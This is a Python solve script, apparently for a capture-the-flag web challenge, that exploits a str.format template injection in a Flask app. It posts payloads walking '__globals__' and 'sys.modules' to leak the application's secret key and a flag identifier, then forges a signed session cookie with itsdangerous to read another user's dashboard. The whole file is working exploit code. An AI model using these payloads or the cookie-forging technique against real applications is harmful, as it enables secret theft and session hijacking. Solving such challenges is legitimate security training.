from itsdangerous import URLSafeTimedSerializer, TimestampSigner, base64_encode
import hashlib
import json
import requests
from time import sleep
from bs4 import BeautifulSoup

host = "http://ictf.maple3142.net:8763"


def sign(data, key):
    signer = TimestampSigner(
        secret_key=key,
        salt="cookie-session",
        key_derivation="hmac",
        digest_method=hashlib.sha1,
    )
    return signer.sign(base64_encode(data)).decode()


sess = requests.Session()
soup = BeautifulSoup(sess.post(host + "/new").text, "html.parser")
uuid = soup.select_one("a[href]").attrs["href"].split("/")[-1]
print(uuid)

sess.post(
    host + "/edit_template",
    data={
        "template": "{headers.get.__globals__[os].sys.modules[flask].current_app.secret_key}"
    },
)
sess.get(host + "/r/" + uuid)
sleep(1)
soup = BeautifulSoup(sess.get(host + "/dashboard").text, "html.parser")
secret_key = soup.select_one("pre").text
print(secret_key)

sess.post(
    host + "/edit_template",
    data={"template": "{headers.get.__globals__[os].sys.modules[main].FLAG_ID}"},
)
sess.get(host + "/r/" + uuid)
sleep(1)
soup = BeautifulSoup(sess.get(host + "/dashboard").text, "html.parser")
flag_id = soup.select_one("pre").text
print(flag_id)

data = json.dumps({"uuid": flag_id})
session = sign(data, secret_key)
soup = BeautifulSoup(
    requests.get(host + "/dashboard", cookies={"session": session}).text, "html.parser"
)
print(soup.select_one("pre").text)
